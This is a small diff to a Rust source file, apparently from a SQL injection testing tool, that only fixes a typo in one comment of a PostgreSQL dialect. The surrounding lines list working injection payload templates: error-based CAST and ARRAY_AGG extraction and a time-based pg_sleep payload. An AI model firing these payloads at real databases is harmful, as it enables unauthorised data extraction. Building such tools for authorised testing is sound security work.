@@ -248,7 +248,7 @@ impl DbmsDialect for PostgreSQL {
             // XMLENTITY error (extracts data via XML parsing error)
             ("' AND 1=CAST((%s) AS INTEGER)-- ", "CAST to INTEGER error"),
             ("' AND 1=CAST((%s) AS NUMERIC)-- ", "CAST to NUMERIC error"),
-            // pg_sleep în cast context (time-based alternative)
+            // pg_sleep in cast context (time-based alternative)
             ("' AND (SELECT 1 FROM PG_SLEEP(CAST((%s) AS INTEGER)))-- ", "pg_sleep cast"),
             // String concatenation in array context
             ("' AND (SELECT * FROM (SELECT ARRAY_AGG((%s)) FROM pg_tables LIMIT 1 OFFSET 0)x)-- ", "ARRAY_AGG error"),
